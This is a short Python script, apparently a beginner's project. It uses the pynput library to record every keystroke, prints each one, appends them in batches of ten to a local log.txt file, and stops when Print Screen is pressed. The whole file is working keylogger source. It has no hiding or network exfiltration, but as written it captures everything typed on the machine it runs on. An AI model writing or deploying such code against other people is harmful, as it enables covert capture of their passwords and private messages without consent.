import pynput.keyboard

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global count,keys
    count += 1
    print("{0} pressed".format(key))
    keys.append(key)

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a", encoding = "utf-8") as file:
        for key in keys:
            k = str(key)
            file.write("{0} pressed\n".format(key))






def on_release(key):
    if key == Key.print_screen:
        print("exitted")
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()